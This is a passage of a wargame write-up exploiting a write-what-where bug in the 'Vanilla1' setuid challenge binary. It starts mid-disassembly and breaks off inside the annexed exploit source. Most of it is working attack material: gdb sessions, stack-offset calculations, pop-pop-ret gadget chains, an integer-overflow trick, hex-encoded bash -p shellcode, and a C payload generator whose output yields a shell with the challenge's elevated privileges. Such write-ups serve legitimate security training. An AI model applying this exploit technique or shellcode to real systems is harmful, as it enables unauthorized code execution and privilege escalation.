+   0x0804855d <+41>:    add    eax,DWORD PTR [ebp-0x24]             ; value2 += buffer;
+   0x08048560 <+44>:    mov    edx,DWORD PTR [ebp-0x20]
+   0x08048563 <+47>:    mov    DWORD PTR [eax],edx                  ; *value2 = value1;
+   ; stack cookie check
+   0x08048565 <+49>:    mov    eax,DWORD PTR [ebp-0xc]              ; stack cookie
+   0x08048568 <+52>:    xor    eax,DWORD PTR gs:0x14
+   0x0804856f <+59>:    je     0x8048576 <insert+66>
+
+   0x08048571 <+61>:    call   0x8048444 <__stack_chk_fail@plt>
+   0x08048576 <+66>:    leave 
+   0x08048577 <+67>:    ret   
+End of assembler dump. We thus have the following stack for insert():             STACK TOP = LOW ADDRESSES
+
+            esp
+        ^   ebp-0x24    |   buffer          |
+        |   ebp-0x20    |   value1          |
+  PUSH  |   ebp-0x1c    |   value2          |   POP
+        |   ebp-0xc     |   stack cookie    V
+            ebp         |   sebp
+            ebp+0x4     |   seip
+            ebp+0x8     |   offset
+            ebp+0xc     |   value
+            ebp+0x10    |   buffer
+
+            STACK BOTTOM = HIGH ADDRESSES The interesting code is between 0x804855a and 0x8048563, the rest is mostly setting up stuffs. From this code we can infer that: - buffer is in fact an array of integers (due to shl eax, 0x2 which is equal to x4) - value2 is an offset - value1 is a value to insert - no return as eax value is not properly re-initialized So it is equivalent to the following code: void insert (int offset, int value, int *array)
+{
+    array[offset] = value;
+} So we can basically write an arbitrary value anywhere we want: a so called "write-what-where". This basically allow us to easily bypass the stack cookie. Time for exploitation. Exploiting a write-what-where We first need to know what to write, there are multiple possibilities: - SEIP (return to code) - SEBP (then craft a fake stack frame and all necessary stuffs) - atexit destructors - DYNAMIC FINI - GOT entry - etc Since this is a write-what-where and we want a reliable exploit, the __stack_chk_fail GOT entry would have been a nice target. Unlucky for us: RELRO so no way. We will target a stack address as the buffer address is on the stack and we control an offset. It will be more reliable than targeting an address in the binary (stack randomization could make the offset change between 0x804.... and stack addresses). SEIP is the obvious candidate here. Since we would like to trigger our payload as soon as possible, insert() SEIP is the target. Second condition: we need a place for our shellcode! We'll "simply" inject it through our "integers array". There is plenty of room (0x1000 = 4096 bytes!). Secondly, good news: no NX, so no need for ROP here. Given that our shellcode is around 22-50 bytes, we get at least 4000 NOPs for our NOPsled. Ok, now we have the theory, let's resolve that challenge! Exploitation In our previous section, our exploit reflexion was as follow: - fill integer array with shellcode - activate payload by overwriting insert() SEIP The following snippets of code is in charge of filling the array: int get_fsize (FILE *fp)
+{
+    int sz_file;
+    int old_offset;
+
+    old_offset = ftell (fp);
+    fseek (fp, 0, SEEK_END);
+    sz_file = ftell (fp);
+    fseek (fp, old_offset, SEEK_SET);
+
+    return sz_file;
+}
+
+// integer to ascii
+char *i2a (uint32_t value)
+{
+    char *intstr;
+    int len_intstr;
+
+    intstr = calloc (21, sizeof(*intstr));
+    memset (intstr, 'a', 19);
+    snprintf (intstr, 19, "%d", value);
+    len_intstr = strlen (intstr);
+    if (intstr > 0)
+        intstr[len_intstr] = 'a';
+
+    return intstr;
+}
+
+struct dpatch_t *fill_array (struct dpatch_t *array, int n_elts, FILE *fp)
+{
+    // buffer
+    char *buffer;
+    // loop
+    int idx_array, idx_buffer; 
+    int sz_file;
+    int rest;
+
+    sz_file = get_fsize (fp);
+    rest = sz_file % 4;
+
+    // alloc buffer
+    buffer = calloc (sz_file + (rest != 0 ? 4 : 0), sizeof(*buffer));
+    if (!buffer)
+        return NULL;
+
+    // read
+    fseek (fp, 0, SEEK_SET);
+    fread (buffer, sz_file, 1, fp);
+
+    // construct array
+    for (idx_array = 0, idx_buffer = 0; idx_array < n_elts - 1; idx_array++, idx_buffer++) {
+        array[idx_array].value = i2a (*((uint32_t *) buffer + idx_buffer));
+        array[idx_array].offset = i2a (idx_buffer);
+    }
+
+    free (buffer);
+
+    return array;
+} Now we need to activate our payload through the vulnerability trigger. We need to compute our insert() SEIP offset. ESP (insert) = ESP (main) - 0x4 (SEIP offset) - 0x4 (SEBP offset) - 0x28
+             = EBP (main) - 0x1050 - 0x4 - 0x4 - 0x28
+             = EBP (main) - 0x1080
+EBP (insert) = ESP (main) - 0x4 (SEIP offset) - 0x4 (SEBP offset)
+             = EBP (main) - 0x1050 - 0x4 - 0x4
+             = EBP (main) - 0x1058
+
+seip (insert) = buffer - (EBP (insert) + 0x4)
+              = (EBP (main) - 0x1020) - (EBP (main) - 0x1058 + 0x4)
+              = 0x3c Ok, we got 0x3c (60) bytes upper on the stack and lower in memory. So we basically are going to create an underflow. Since there seems to be only unsigned integers but multiplied by 0x4. We need to have "real" value: 3c = 15 * 4 Ok we got our offset, what about our value to insert? We can avoid guessing the 4 bytes of the address. We can do that by overwriting only 2 last bytes of insert() SEIP (it would thus junk 2 bytes afterward but we don't really care about those). Since we multiply by 4, this technique is not possible (it has to be a multiple of 4). There is an actual better solution. Remember our insert() stack?             STACK TOP = LOW ADDRESSES
+
+            esp
+        ^   ebp-0x24    |   buffer          |
+        |   ebp-0x20    |   value1          |
+  PUSH  |   ebp-0x1c    |   value2          |   POP
+        |   ebp-0xc     |   stack cookie    V
+            ebp         |   sebp
+            ebp+0x4     |   seip
+            ebp+0x8     |   offset
+            ebp+0xc     |   value
+            ebp+0x10    |   buffer
+
+            STACK BOTTOM = HIGH ADDRESSES We have buffer address laying on the stack! We may be able to reuse it :). Let's check: We're going to break on: -   0x0804867d <main+261> : call 0x8048534 <insert> -   0x08048577 <insert+67>: ret gdb$ b *0x0804867d
+gdb$ b *0x08048577
+gdb$ r /tmp/test.txt
+--------------------------------------------------------------------------[regs]
+  EAX: FFFFFFF1  EBX: 9CB15E54  ECX: 00000001  EDX: FFFFFFFF  o d I t S z a p c 
+  ESI: 00000000  EDI: 00000000  EBP: B3D36E58  ESP: B3D35E00  EIP: 0804867D
+  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
+[007B:B3D35E00]----------------------------------------------------------[stack]
+B3D35E50 : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
+B3D35E40 : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
+B3D35E30 : 00 E8 76 48  C8 61 05 08 - 00 00 00 00  00 00 00 00 ..vH.a..........
+B3D35E20 : 00 00 00 00  00 00 00 00 - 00 00 00 00  F1 FF FF FF ................
+B3D35E10 : 00 00 00 00  00 00 00 00 - 04 6F D3 B3  02 00 00 00 .........o......
+B3D35E00 : F1 FF FF FF  00 E8 76 48 - 38 5E D3 B3  00 00 00 00 ......vH8^......
+[007B:B3D35E00]-----------------------------------------------------------[data]
+B3D35E00 : F1 FF FF FF  00 E8 76 48 - 38 5E D3 B3  00 00 00 00 ......vH8^......
+B3D35E10 : 00 00 00 00  00 00 00 00 - 04 6F D3 B3  02 00 00 00 .........o......
+B3D35E20 : 00 00 00 00  00 00 00 00 - 00 00 00 00  F1 FF FF FF ................
+B3D35E30 : 00 E8 76 48  C8 61 05 08 - 00 00 00 00  00 00 00 00 ..vH.a..........
+B3D35E40 : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
+B3D35E50 : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
+B3D35E60 : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
+B3D35E70 : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
+[0073:0804867D]-----------------------------------------------------------[code]
+=> 0x804867d <main+261>:    call   0x8048534 <insert>
+   0x8048682 <main+266>:    mov    eax,DWORD PTR [esp+0x34]
+   0x8048686 <main+270>:    mov    DWORD PTR [esp+0x8],eax
+   0x804868a <main+274>:    mov    DWORD PTR [esp+0x4],0x14
+   0x8048692 <main+282>:    lea    eax,[esp+0x1038]
+   0x8048699 <main+289>:    mov    DWORD PTR [esp],eax
+   0x804869c <main+292>:    call   0x80483e4 <fgets@plt>
+   0x80486a1 <main+297>:    test   eax,eax
+--------------------------------------------------------------------------------
+
+Breakpoint 1, 0x0804867d in main ()
+gdb$ gdb$ p/x $ebp-0x1020
+$1 = 0xb3d35e38
+gdb$ c
+--------------------------------------------------------------------------[regs]
+  EAX: 00000000  EBX: 9CB15E54  ECX: 00000001  EDX: 4876E800  o d I t s Z a P c 
+  ESI: 00000000  EDI: 00000000  EBP: B3D36E58  ESP: B3D35DFC  EIP: 08048577
+  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
+[007B:B3D35DFC]----------------------------------------------------------[stack]
+B3D35E4C : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
+B3D35E3C : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
+B3D35E2C : F1 FF FF FF  00 E8 76 48 - C8 61 05 08  00 00 00 00 ......vH.a......
+B3D35E1C : 02 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
+B3D35E0C : 00 00 00 00  00 00 00 00 - 00 00 00 00  04 6F D3 B3 .............o..
+B3D35DFC : 00 E8 76 48  F1 FF FF FF - 00 E8 76 48  38 5E D3 B3 ..vH......vH8^..
+[007B:B3D35DFC]-----------------------------------------------------------[data]
+B3D35DFC : 00 E8 76 48  F1 FF FF FF - 00 E8 76 48  38 5E D3 B3 ..vH......vH8^..
+B3D35E0C : 00 00 00 00  00 00 00 00 - 00 00 00 00  04 6F D3 B3 .............o..
+B3D35E1C : 02 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
+B3D35E2C : F1 FF FF FF  00 E8 76 48 - C8 61 05 08  00 00 00 00 ......vH.a......
+B3D35E3C : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
+B3D35E4C : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
+B3D35E5C : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
+B3D35E6C : 00 00 00 00  00 00 00 00 - 00 00 00 00  00 00 00 00 ................
+[0073:08048577]-----------------------------------------------------------[code]
+=> 0x8048577 <insert+67>:    ret   
+   0x8048578 <main>:    push   ebp
+   0x8048579 <main+1>:    mov    ebp,esp
+   0x804857b <main+3>:    and    esp,0xfffffff0
+   0x804857e <main+6>:    sub    esp,0x1050
+   0x8048584 <main+12>:    mov    eax,DWORD PTR [ebp+0x8]
+   0x8048587 <main+15>:    mov    DWORD PTR [esp+0x1c],eax
+   0x804858b <main+19>:    mov    eax,DWORD PTR [ebp+0xc]
+--------------------------------------------------------------------------------
+
+Breakpoint 2, 0x08048577 in insert ()
+gdb$ x/10wx $esp
+0xb3d35dfc:    0x08048767    0xfffffff1    0x08048767    0xb3d35e38
+0xb3d35e0c:    0x00000000    0x00000000    0x00000000    0xb3d36f04
+0xb3d35e1c:    0x00000002    0x00000000 0x08048767 is our rewritten SEIP :). 0xfffffff1 is -15 0x08048767 the value we gave 0xb3d35e38 is our buffer value 0xb3d36f04 point to env[] Ok, great, we have a pointer to our buffer. We now need an instruction of style pop pop ret. Exploitation POP-POP-RET style First, we need our pop-pop-ret. $ objdump -d ./Vanilla1
+...
+ 8048767:    5b                       pop    %ebx
+ 8048768:    5d                       pop    %ebp
+ 8048769:    c3                       ret   
+... Here we go. The trigger is thus done this way:     // fill array with shellcode
+    fill_array (array, n_elts, fp_in);
+    // set trigger
+    array[n_elts-1].value = i2a (0x8048767);
+    array[n_elts-1].offset = i2a(-15); 0x8048767 is the address to the pop-pop-ret. -15 is the offset to SEIP. Now we should have everything we need for reliable exploitation. Let's try our sploit. m101@m101-laptop:~/challenges/vanilla_dome$ ./exploit1.rev1 bash-p.bin payload.bin 
+sz_file = 33
+rest    = 1
+n_elts  = 9
+2d 31 37 32 32 32 38 33 31 35 38 61 61 61 61 61 61 61 61 | -1722283158aaaaaaaa
+30 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 0aaaaaaaaaaaaaaaaaa
+37 36 31 38 31 36 36 35 38 61 61 61 61 61 61 61 61 61 61 | 761816658aaaaaaaaaa
+31 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 1aaaaaaaaaaaaaaaaaa
+31 33 39 30 35 31 32 34 39 36 61 61 61 61 61 61 61 61 61 | 1390512496aaaaaaaaa
+32 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 2aaaaaaaaaaaaaaaaaa
+37 39 35 33 37 31 36 32 36 61 61 61 61 61 61 61 61 61 61 | 795371626aaaaaaaaaa
+33 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 3aaaaaaaaaaaaaaaaaa
+31 37 35 32 33 39 32 30 33 34 61 61 61 61 61 61 61 61 61 | 1752392034aaaaaaaaa
+34 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 4aaaaaaaaaaaaaaaaaa
+31 38 35 32 34 30 30 31 37 35 61 61 61 61 61 61 61 61 61 | 1852400175aaaaaaaaa
+35 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 5aaaaaaaaaaaaaaaaaa
+31 33 36 34 33 38 36 36 39 37 61 61 61 61 61 61 61 61 61 | 1364386697aaaaaaaaa
+36 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 6aaaaaaaaaaaaaaaaaa
+2d 38 34 30 38 35 37 32 36 31 61 61 61 61 61 61 61 61 61 | -840857261aaaaaaaaa
+37 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 7aaaaaaaaaaaaaaaaaa
+31 32 38 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 128aaaaaaaaaaaaaaaa
+38 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 8aaaaaaaaaaaaaaaaaa
+31 33 34 35 31 34 35 33 35 61 61 61 61 61 61 61 61 61 61 | 134514535aaaaaaaaaa
+2d 31 35 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | -15aaaaaaaaaaaaaaaa
+
+On the remote machine:
+vanilla1@VanillaDome /tmp $ ~/Vanilla1 v1.1.txt
+Segmentation fault Woot! It doesn't work! Let's check the stack. gdb$ b *0x08048577
+Breakpoint 1 at 0x8048577
+gdb$ condition 1 $edx==0x8048767
+gdb$ r payload.bin We break as soon as edx == 0x8048577 (which is our last value). gdb$ x/10wx $esp
+0xb3d35dfc:    0x08048767    0xfffffff1    0x08048767    0xb3d35e38
+0xb3d35e0c:    0x00000000    0x00000000    0x00000000    0xb3d36f04
+0xb3d35e1c:    0x00000002    0x00000000
+
+gdb$ x/10wx 0xb3d35e38
+0xb3d35e38:    0x00000000    0x2d686652    0x52e18970    0x2f68686a
+0xb3d35e48:    0x68736162    0x6e69622f    0x5152e389    0xcde18953
+0xb3d35e38:    0x00000080    0x00000000 Whoops, the first 4 bytes are never written. That's explained by the fact that insert() isn't called if atoll() return 0. We can fix it through 2 methods: - put our payload somewhere else in the stack - use arithmetic tricks Putting our payload somewhere else Remember about 0xb3d36f04 ? This is our env[] pointer. We need an address in stack to use the same trick as before with the pop-pop-ret. gdb$ x/10wx 0xb3d36f04
+0xb3d36f04:    0xbd4dea72    0xbd4dea8a    0x00000000    0xbd4dea93
+0xb3d36f14:    0xbd4deb25    0xbd4deb35    0xbd4deb40    0xbd4deb64
+0xb3d36f24:    0xbd4deb77    0xbd4deb85 If you check each pointers: gdb$ x/s 0xbd4dea72
+0xbd4dea72:     "/home/vanilla1/Vanilla1"
+gdb$ x/s 0xbd4dea8a
+0xbd4dea8a:     "payload.bin"
+gdb$ x/s 0xbd4deb64
+0xbd4deb64:     "SSH_TTY=/dev/pts/0" You get environment values. We can trash those pointers, we don't really need them (our shell won't be happy but it'll still work). In order to overwrite those pointers, we need our offset: 0xb3d36f04 - 0xb3d35e38 = 0x10CC = 4300 And we need to pop 6 values out of the stack. For that, I chose 2 gadgets chained together: 0x08048735: pop ebx ; pop esi ; pop edi ; pop ebp ; ret  ;  (1 found)
+0x08048503: pop ebp ; ret  ;  (1 found) Your stack will look like this when the trigger is set up: gdb$ x/10wx $esp
+0xb3d35dfc:    0x08048735    0xfffffff1    0x08048735    0xb3d35e38
+0xb3d35e0c:    0x00000000    0x08048503    0x00000000    0xb3d36f04
+0xb3d35e1c:    0x00000002    0x00000000 It will return directly to 0xb3d36f04 and gain code execution. Let's try: m101@m101-laptop:~/challenges/vanilla_dome$ ./exploit1.rev2 bash-p.bin v1.2txt
+sz_file = 33
+rest    = 1
+n_elts  = 9
+6a 0b 58 99                                     | j.X.
+52 66 68 2d                                     | Rfh-
+70 89 e1 52                                     | p..R
+6a 68 68 2f                                     | jhh/
+62 61 73 68                                     | bash
+2f 62 69 6e                                     | /bin
+89 e3 52 51                                     | ..RQ
+53 89 e1 cd                                     | S...
+80 00 00 00                                     | ....
+2d 31 37 32 32 32 38 33 31 35 38 61 61 61 61 61 61 61 61 | -1722283158aaaaaaaa
+31 30 37 35 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 1075aaaaaaaaaaaaaaa
+37 36 31 38 31 36 36 35 38 61 61 61 61 61 61 61 61 61 61 | 761816658aaaaaaaaaa
+31 30 37 36 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 1076aaaaaaaaaaaaaaa
+31 33 39 30 35 31 32 34 39 36 61 61 61 61 61 61 61 61 61 | 1390512496aaaaaaaaa
+31 30 37 37 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 1077aaaaaaaaaaaaaaa
+37 39 35 33 37 31 36 32 36 61 61 61 61 61 61 61 61 61 61 | 795371626aaaaaaaaaa
+31 30 37 38 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 1078aaaaaaaaaaaaaaa
+31 37 35 32 33 39 32 30 33 34 61 61 61 61 61 61 61 61 61 | 1752392034aaaaaaaaa
+31 30 37 39 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 1079aaaaaaaaaaaaaaa
+31 38 35 32 34 30 30 31 37 35 61 61 61 61 61 61 61 61 61 | 1852400175aaaaaaaaa
+31 30 38 30 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 1080aaaaaaaaaaaaaaa
+31 33 36 34 33 38 36 36 39 37 61 61 61 61 61 61 61 61 61 | 1364386697aaaaaaaaa
+31 30 38 31 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 1081aaaaaaaaaaaaaaa
+2d 38 34 30 38 35 37 32 36 31 61 61 61 61 61 61 61 61 61 | -840857261aaaaaaaaa
+31 30 38 32 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 1082aaaaaaaaaaaaaaa
+31 32 38 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 128aaaaaaaaaaaaaaaa
+31 30 38 33 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 1083aaaaaaaaaaaaaaa
+31 33 34 35 31 33 39 32 33 61 61 61 61 61 61 61 61 61 61 | 134513923aaaaaaaaaa
+2d 31 30 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | -10aaaaaaaaaaaaaaaa
+31 33 34 35 31 34 34 38 35 61 61 61 61 61 61 61 61 61 61 | 134514485aaaaaaaaaa
+2d 31 35 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | -15aaaaaaaaaaaaaaaa On the challenge machine: vanilla1@VanillaDome /tmp $ ~/Vanilla1 v1.2.txt
+bash-4.1$ id
+uid=1014(vanilla1) gid=1015(vanilla1) euid=1008(vanilla1crack) egid=1009(vanilla1crack) groups=1009(vanilla1crack),1015(vanilla1)
+bash-4.1$ pwd
+/tmp
+bash-4.1$ cd
+bash: cd: HOME not set
+bash-4.1$ cd ~
+bash-4.1$ pwd
+/home/vanilla1 Just so you don't bang your header, use bash -p payload or you won't get the suid. Pawn! I wanted it to be a bit cleaner. Trashing the env[], not cool. Let's try bypassing that 0 restriction through arithmetic tricks. Arithmetic trick For the careful reader, you may have spotted some interesting line in insert() code. If not: Dump of assembler code for function insert:
+   0x08048534 <+0>:    push   ebp
+   0x08048535 <+1>:    mov    ebp,esp
+   0x08048537 <+3>:    sub    esp,0x28
+   0x0804853a <+6>:    mov    eax,DWORD PTR [ebp+0x8]              ; eax = value2
+   0x0804853d <+9>:    mov    DWORD PTR [ebp-0x1c],eax
+   0x08048540 <+12>:    mov    eax,DWORD PTR [ebp+0xc]              ; eax = value1
+   0x08048543 <+15>:    mov    DWORD PTR [ebp-0x20],eax
+   0x08048546 <+18>:    mov    eax,DWORD PTR [ebp+0x10]             ; eax = buffer
+   0x08048549 <+21>:    mov    DWORD PTR [ebp-0x24],eax
+   0x0804854c <+24>:    mov    eax,gs:0x14                          ; stack cookie
+   0x08048552 <+30>:    mov    DWORD PTR [ebp-0xc],eax
+   0x08048555 <+33>:    xor    eax,eax
+   0x08048557 <+35>:    mov    eax,DWORD PTR [ebp-0x1c]
+   0x0804855a <+38>:    shl    eax,0x2                              ; value2 <<= 2;
+   0x0804855d <+41>:    add    eax,DWORD PTR [ebp-0x24]             ; value2 += buffer;
+   0x08048560 <+44>:    mov    edx,DWORD PTR [ebp-0x20]
+   0x08048563 <+47>:    mov    DWORD PTR [eax],edx                  ; *value2 = value1;
+   ; stack cookie check
+   0x08048565 <+49>:    mov    eax,DWORD PTR [ebp-0xc]              ; stack cookie
+   0x08048568 <+52>:    xor    eax,DWORD PTR gs:0x14
+   0x0804856f <+59>:    je     0x8048576 <insert+66>
+
+   0x08048571 <+61>:    call   0x8048444 <__stack_chk_fail@plt>
+   0x08048576 <+66>:    leave 
+   0x08048577 <+67>:    ret   
+End of assembler dump. The interesting line is here: 0x0804855a <+38>:    shl    eax,0x2                              ; value2 <<= 2; Our offset is multiplied by 4. We can thus manage to overflow our offset so it becomes 0. We want 0x1 0000 0000 so offset will be equal to 0x4000 0000. That's how we get the zero! Let's try: m101@m101-laptop:~/challenges/vanilla_dome$ ./exploit1 bash-p.bin payload.bin 
+sz_file = 33
+rest    = 1
+n_elts  = 9
+6a 0b 58 99                                     | j.X.
+52 66 68 2d                                     | Rfh-
+70 89 e1 52                                     | p..R
+6a 68 68 2f                                     | jhh/
+62 61 73 68                                     | bash
+2f 62 69 6e                                     | /bin
+89 e3 52 51                                     | ..RQ
+53 89 e1 cd                                     | S...
+80 00 00 00                                     | ....
+2d 31 37 32 32 32 38 33 31 35 38 61 61 61 61 61 61 61 61 | -1722283158aaaaaaaa
+31 30 37 33 37 34 31 38 32 34 61 61 61 61 61 61 61 61 61 | 1073741824aaaaaaaaa
+37 36 31 38 31 36 36 35 38 61 61 61 61 61 61 61 61 61 61 | 761816658aaaaaaaaaa
+31 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 1aaaaaaaaaaaaaaaaaa
+31 33 39 30 35 31 32 34 39 36 61 61 61 61 61 61 61 61 61 | 1390512496aaaaaaaaa
+32 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 2aaaaaaaaaaaaaaaaaa
+37 39 35 33 37 31 36 32 36 61 61 61 61 61 61 61 61 61 61 | 795371626aaaaaaaaaa
+33 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 3aaaaaaaaaaaaaaaaaa
+31 37 35 32 33 39 32 30 33 34 61 61 61 61 61 61 61 61 61 | 1752392034aaaaaaaaa
+34 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 4aaaaaaaaaaaaaaaaaa
+31 38 35 32 34 30 30 31 37 35 61 61 61 61 61 61 61 61 61 | 1852400175aaaaaaaaa
+35 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 5aaaaaaaaaaaaaaaaaa
+31 33 36 34 33 38 36 36 39 37 61 61 61 61 61 61 61 61 61 | 1364386697aaaaaaaaa
+36 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 6aaaaaaaaaaaaaaaaaa
+2d 38 34 30 38 35 37 32 36 31 61 61 61 61 61 61 61 61 61 | -840857261aaaaaaaaa
+37 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 7aaaaaaaaaaaaaaaaaa
+31 32 38 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 128aaaaaaaaaaaaaaaa
+38 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | 8aaaaaaaaaaaaaaaaaa
+31 33 34 35 31 34 35 33 35 61 61 61 61 61 61 61 61 61 61 | 134514535aaaaaaaaaa
+2d 31 35 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 | -15aaaaaaaaaaaaaaaa On the remote machine: vanilla1@VanillaDome /tmp $ ~/Vanilla1 v1.3.txt
+bash-4.1$ pwd
+/tmp
+bash-4.1$ cd
+bash: cd: HOME not set
+bash-4.1$ pwd
+/tmp
+bash-4.1$ cd ~
+bash-4.1$ pwd
+/home/vanilla1 Challenge completely owned :). Conclusion As you can see, with a bit of work, motivation and some vulnerability, you can bypass protections. ASLR was of no use here as we bypass it through offsets and pointers laying on the stack. RELRO didn't stop us as we can write on the stack with a write-what-where. If NX were to be set, it wouldn't have stopped us either as we can still craft a rop chain. The problem would more have to been about the number of available gadgets. That's all for today, hope you enjoyed it. Cheers, m_101 References: - bash -p payload - Vanilla Dome Wargame - RELRO: RELocation Read-Only - Reversing Linux : Comprendre le rôle des sections PLT et GOT dans l’édition de liens dynamique Annex: The exploit #include <stdio.h>
+#include <stdlib.h>
+
+#include <string.h>
+
+#include <stdint.h>
+
+struct dpatch_t
+{
+    char *value;
+    char *offset;
+};
+
+/*
+ 8048767:    5b                       pop    %ebx
+ 8048768:    5d                       pop    %ebp
+ 8048769:    c3                       ret
+*/
+
+int get_fsize (FILE *fp);
+int get_nelts (FILE *fp);
+char *i2a (uint32_t value);
+struct dpatch_t *fill_array (int off_buffer, struct dpatch_t *array, int n_elts, FILE *fp);
+int dump (unsigned char *bytes, size_t nbytes, size_t align);
+
+int main (int argc, char *argv[])
+{
+    int n_elts;
+    int idx_array;
+    struct dpatch_t *array;
+    FILE *fp_in, *fp_out;
+
+    if (argc != 3) {
+        printf ("Usage: %s [input] [output]\n", argv[0]);
+        exit (1);
+    }
+
+    fp_in = fopen (argv[1], "r");
+    if (!fp_in)
+        return 1;
+
+    fp_out = fopen (argv[2], "w");
+    if (!fp_out)
+        return 1;
+
+    n_elts = get_nelts (fp_in);
+
+    // alloc array
+    array = calloc (n_elts + 200, sizeof(*array));
+    if (!array)
+        return 1;
+
+    // fill array with shellcode
+    fill_array (0, array, n_elts, fp_in);
+    // set trigger
+    array[n_elts].value = i2a (0x8048767);
+    array[n_elts].offset = i2a (-15);
+
+    // show debug
+    for (idx_array = 0; idx_array < n_elts + 2; idx_array++) {
+        if (array[idx_array].value && array[idx_array].value) {
+            dump (array[idx_array].value, strlen (array[idx_array].value), strlen (array[idx_array].value));
+            dump (array[idx_array].offset, strlen (array[idx_array].offset), strlen(array[idx_array].offset));
+        }
+    }
+
+    // create payload file
+    for (idx_array = 0; idx_array < n_elts + 2; idx_array++) {
+        if (array[idx_array].value && array[idx_array].value) {
+            fwrite (array[idx_array].value, 1, strlen(array[idx_array].value), fp_out);
+            fwrite (array[idx_array].offset, 1, strlen(array[idx_array].offset), fp_out);
+        }
+    }
+
+    fclose (fp_in);
+    fclose (fp_out);
+
+    return 0;
+}
+
+int get_fsize (FILE *fp)
+{
+    int sz_file;
+    int old_offset;
+
+    old_offset = ftell (fp);
+    fseek (fp, 0, SEEK_END);
+    sz_file = ftell (fp);
+    fseek (fp, old_offset, SEEK_SET);
+
+    return sz_file;
+}
+
+int get_nelts (FILE *fp)
+{
+    int sz_file;
+    int n_elts, rest;
+
+    // compute array n_elts
+    sz_file = get_fsize (fp);
+    rest = sz_file % 4;
+    n_elts = (sz_file - rest) / 4 + (rest > 0 ? 1 : 0);
+
+    printf ("sz_file = %d\n", sz_file);
+    printf ("rest    = %d\n", rest);
+    printf ("n_elts  = %d\n", n_elts);
+
+    return n_elts;
+}
+
+// integer to ascii
+char *i2a (uint32_t value)
+{
+    char *intstr;
+    int len_intstr;
+
+    intstr = calloc (21, sizeof(*intstr));
+    memset (intstr, 'a', 19);
+    snprintf (intstr, 19, "%d", value);
+    len_intstr = strlen (intstr);
+    if (intstr > 0)
+        intstr[len_intstr] = 'a';
+
+    return intstr;
+}
+
+struct dpatch_t *fill_array (int off_buffer, struct dpatch_t *array, int n_elts, FILE *fp)
+{
+    // buffer
+    char *buffer;
+    // loop
+    int idx_array, idx_buffer; 
+    int sz_file;
+    int rest;
+
+    sz_file = get_fsize (fp);
+    rest = sz_file % 4;
+
+    // alloc buffer
+    buffer = calloc (sz_file + (rest != 0 ? 4 : 0), sizeof(*buffer));
+    if (!buffer)
+        return NULL;
+
+    // read
+    fseek (fp, 0, SEEK_SET);
+    fread (buffer, sz_file, 1, fp);
+
+    // fix off_buffer
+    off_buffer = off_buffer / 4;
+
+    // construct array
+    for (idx_array = 0, idx_buffer = 0; idx_array < n_elts; idx_array++, idx_buffer++) {
+        dump (((uint32_t *) buffer + idx_buffer), 4, 16);
+        array[idx_array].value = i2a (*((uint32_t *) buffer + idx_buffer));
+        if (idx_buffer == 0 && off_buffer == 0)
+            array[idx_array].offset = i2a (0x40000000);
+        else
+            array[idx_array].offset = i2a (idx_buffer + off_buffer);
+    }
+
+    free (buffer);
+
+    return array;
+}
+
+// dump
+int dump (unsigned char *bytes, size_t nbytes, size_t align)
+{
+    size_t idx_bytes, j, last;
+    int n_disp;
+
+    if (!bytes || !nbytes)
+        return -1;
+
+    // first part of line is hex
+    for (idx_bytes = 0, last = 0; idx_bytes < nbytes; idx_bytes++) {
+        printf ("%02x ", bytes[idx_bytes]);
+        // if we got to the alignment value or end of bytes
